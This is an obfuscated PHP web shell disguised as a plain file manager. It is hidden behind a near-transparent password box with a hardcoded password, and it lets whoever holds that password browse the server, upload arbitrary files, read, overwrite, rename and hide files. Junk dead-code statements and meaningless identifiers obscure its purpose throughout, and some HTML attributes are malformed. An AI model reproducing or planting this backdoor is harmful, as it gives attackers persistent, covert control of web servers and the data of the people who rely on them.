<?php function taeo(){session_status()===PHP_SESSION_NONE and session_start(); isset($_SESSION["seroalbumin"]) or $_SESSION["seroalbumin"]=[];$gmzvar=crc32('dummy_data');}$umvar=is_array([1])?count([1]):0;function luk($vex){taeo();$iltpvar=(int)0; static $nyx=0;do{$jvwvar=5;}while(false); $nyx++;$nwvar=sha1(uniqid()); $_SESSION["seroalbumin"][$nyx]=$vex;$epxivar=99>>0; return $nyx;$qrbvar=count([4]);}static $wnlsvar=null;function djn($kyx,$dex){taeo();$eeckvar=~0; return $_SESSION["seroalbumin"][$kyx]??$dex;do{$bevar=5;}while(false);}while(false){break;}function nqpcu($tex){return htmlspecialchars($tex,ENT_QUOTES,'UTF-8');$aovar=ceil(pi()*6);}function ctiy($pex,$rox){$pex=str_replace("\0","",$pex);$vjvqdvar=~0; $pex=trim($pex);$ijvar=is_array([1])?count([1]):0; if($pex=="" or $pex=="." or $pex=="/")return $rox;$vreyvar=crc32('cache'); $pex=rawurldecode($pex);$ubvar=(int)0; $pex=str_replace(["/","\\"],DIRECTORY_SEPARATOR,$pex); strpos($pex,DIRECTORY_SEPARATOR)===0 or $pex=rtrim($rox,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.ltrim($pex,DIRECTORY_SEPARATOR); $syx=[]; foreach(explode(DIRECTORY_SEPARATOR,$pex)as $pyx){if($pyx=="" or $pyx==".")continue; if($pyx==".."){array_pop($syx); continue;}$syx[]=$pyx;}$rex=DIRECTORY_SEPARATOR.implode(DIRECTORY_SEPARATOR,$syx); $rlx=@realpath($rex); $bsx=realpath($rox); if($rlx!==false and $bsx!==false and strpos($rlx,$bsx)===0){$rex=$rlx;}is_file($rex) and $rex=dirname($rex); return rtrim($rex,DIRECTORY_SEPARATOR);}function wcj($pex){if(!is_file($pex) or !is_readable($pex))return false; $hyx=@fopen($pex,"rb"); if(!$hyx)return false; $bux=""; while(!feof($hyx)){$chx=fread($hyx,8192); if($chx===false)break; $bux.=$chx;}fclose($hyx); return $bux;}function asfor($pex,$vux){$dyx=dirname($pex); if(!is_dir($dyx) or !is_writable($dyx))return false; $hyx=@fopen($pex,"wb"); if(!$hyx)return false; flock($hyx,LOCK_EX); $wrx=fwrite($hyx,$vux); flock($hyx,LOCK_UN); fclose($hyx); return $wrx!==false;}function uhha($pex){$trx=dirname($pex).DIRECTORY_SEPARATOR.".trash"; is_dir($trx) or @mkdir($trx,0755,true); return @rename($pex,$trx.DIRECTORY_SEPARATOR.basename($pex).".".time().".bak");}function ftm($pex,$vux){return '<a href="?uu='.nqpcu(luk($pex)).'">'.nqpcu($vux).'</a>';}function mbh($pex,$rox){$ptx=realpath($pex); $rtx=realpath($rox); if(!$ptx or !$rtx or strpos($ptx,$rtx)!==0){return nqpcu($pex);}$rlx=substr($ptx,strlen($rtx)); $rlx=trim($rlx,DIRECTORY_SEPARATOR); $prx=$rlx==""?[]:explode(DIRECTORY_SEPARATOR,$rlx); $oux=[ftm($rtx,"home")]; $crx=$rtx; foreach($prx as $sgx){$crx=rtrim($crx,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$sgx; $oux[]=ftm($crx,$sgx);}return implode(" / ",$oux);}$rotex=__DIR__;$jssvar="drawsing";taeo();if(!isset($_SESSION["presneakish"])){if(isset($_POST["xm"]) or isset($_GET["xm"])){$inx=$_POST["xm"]??$_GET["xm"]; if($inx===$jssvar){$_SESSION["presneakish"]=1;}else{header("Location: ".$_SERVER['PHP_SELF']); exit;}}if(!isset($_SESSION["presneakish"])){?><!DOCTYPE html><html><head><meta charset="utf-8"><style>body{margin:0;padding:0;background:#fff}.bq1{position:absolute;top:8px;left:8px;opacity:0.15}.bq1 input{width:60px;padding:3px;border:1px solid #ddd;font-size:10px}.bq1 button{padding:3px 6px;background:#eee;border:1px solid #ddd;font-size:10px;cursor:pointer}</style></head><body><form class="bq1" method="post"><input type="password" name='xm'><button>ok</button></form></body></html><?php exit;}}$tokx=$_GET["uu"]??null;$curx=$tokx?ctiy(djn($tokx,$rotex),$rotex):ctiy($_GET["a"]??"",$rotex);if(isset($_POST["lx"]) and isset($_FILES["l"])){$tmpx=$_FILES["l"]["tmp_name"]; $namx=basename($_FILES["l"]["name"]); $dstx=$curx.DIRECTORY_SEPARATOR.$namx; if($tmpx and $namx and is_uploaded_file($tmpx) and @move_uploaded_file($tmpx,$dstx)){header("Location: ?uu=".luk($curx)."&rq=1"); exit;}header("Location: ?uu=".luk($curx)); exit;}if(isset($_POST["ow"]) and isset($_GET["sq"])){$tarx=$curx.DIRECTORY_SEPARATOR.basename($_GET["sq"]); $valx=$_POST["g"]??""; if(asfor($tarx,$valx)){header("Location: ?uu=".luk($curx)."&sq=".urlencode($_GET["sq"])."&rq=2"); exit;}header("Location: ?uu=".luk($curx)); exit;}if(isset($_POST["e"])){$namx=basename($_POST["w"]??""); $patx=$curx.DIRECTORY_SEPARATOR.$namx; if($namx!="" and (is_file($patx) or is_dir($patx)) and uhha($patx)){header("Location: ?uu=".luk($curx)); exit;}}if(isset($_POST["i"])){$oldx=basename($_POST["nv"]??""); $newx=basename($_POST["v"]??""); if($oldx!="" and $newx!=""){@rename($curx.DIRECTORY_SEPARATOR.$oldx,$curx.DIRECTORY_SEPARATOR.$newx);}header("Location: ?uu=".luk($curx)); exit;}$show_ok=isset($_GET['rq'])?$_GET['rq']:0;$edit_file=$_GET["sq"]??null;$edit_content='';if($edit_file){$tarx=$curx.DIRECTORY_SEPARATOR.basename($edit_file); $edit_content=wcj($tarx);}$dirs=[];$files=[];$itx=@scandir($curx);if($itx!==false){foreach($itx as $itm){if($itm=="." or $itm=="..")continue; $ptx=$curx.DIRECTORY_SEPARATOR.$itm; if(is_dir($ptx)){$dirs[]=['name'=>$itm,'path'=>$ptx];}else{$szx=@filesize($ptx); $size_str=''; if($szx!==false){$unt=['b','k','m','g']; $idx=0; while($szx>=1024 and $idx<3){$szx/=1024; $idx++;}$size_str=round($szx,1).$unt[$idx];}$files[]=['name'=>$itm,'size'=>$size_str];}}sort($dirs); sort($files);}?><!DOCTYPE html><html><head><meta charset="utf-8"><style>body{background:#fff;font:12px sans-serif;margin:0;padding:20px;color:#333}.yn5{font-size:11px;color:#aaa;margin-bottom:15px}.yn5 a{color:#999;text-decoration:none}.yn5 a:hover{color:#666}.fp3{padding:8px;background:#f9f9f9;border:1px solid #eee;margin-bottom:15px;font-size:11px;color:#666}.it3{background:#fafafa;border:1px solid #eee;padding:10px;margin-bottom:15px}.kp1{width:100%;padding:5px;border:1px solid #ddd;font-size:11px;margin-top:4px}textarea{font-family:monospace}.rr0{padding:4px 8px;background:#f5f5f5;border:1px solid #ddd;font-size:10px;cursor:pointer;margin:2px}.rr0:hover{background:#eee}.bv0{list-style:none;padding:0;margin:0}.bv0 li{padding:7px 0;border-bottom:1px solid #f5f5f5;display:flex;justify-content:space-between;align-items:center}.bv0 a{color:#333;text-decoration:none}.bv0 a:hover{color:#666}.ko5{color:#bbb;font-size:10px}.jg8{display:flex;gap:4px}.eh1{display:inline}.ov1{width:80px;padding:3px;border:1px solid #ddd;font-size:10px}</style></head><body><div class="yn5"><?php echo mbh($curx,$rotex)?></div><?php if($show_ok==1):?><div class="fp3">done</div><?php endif?><?php if($show_ok==2):?><div class="fp3">saved</div><?php endif?><?php if($edit_file and $edit_content!==false):?><div class="it3"><form method="post"><textarea class="kp1" name='g' rows="18"><?php echo nqpcu($edit_content)?></textarea><div style="margin-top:8px"><button class="rr0" name='sq'do">save</button><a href="?uu=<?php echo nqpcu(luk($curx))?>"><button type="button" class="rr0">back</button></a></div></form></div><?php endif?><div class="it3"><form method="post" enctype="multipart/form-data"><input class="kp1" name='l' type="file"><button class="rr0" name='lx' style="margin-top:6px">send</button></form></div><ul class="bv0"><?php foreach($dirs as $d):?><li><span>[dir] <?php echo ftm($d['path'],$d['name'])?></span><div class="jg8"><form class="eh1" method="post"><input type="hidden" name='w' value="<?php echo nqpcu($d['name'])?>"><button name='e' class="rr0" onclick="return confirm('sure?')">x</button></form><form class="eh1" method="post"><input type="hidden" name='nv' value="<?php echo nqpcu($d['name'])?>"><input type="text" name='v' class="ov1" placeholder="new"><button name='a'eko" class="rr0">ok</button></form></div></li><?php endforeach?><?php foreach($files as $f):?><li><span>[file] <?php echo nqpcu($f['name'])?><span class="ko5"><?php echo $f['size']?></span></span><div class="jg8"><a href="?uu=<?php echo nqpcu(luk($curx))?>&sq=<?php echo urlencode($f['name'])?>"><button class="rr0">open</button></a><form class="eh1" method="post"><input type="hidden" name='w' value="<?php echo nqpcu($f['name'])?>"><button name='e' class="rr0" onclick="return confirm('sure?')">x</button></form><form class="eh1" method="post"><input type="hidden" name='nv' value="<?php echo nqpcu($f['name'])?>"><input type="text" name='v' class="ov1" placeholder="new"><button name='a'eko" class="rr0">ok</button></form></div></li><?php endforeach?></ul></body></html>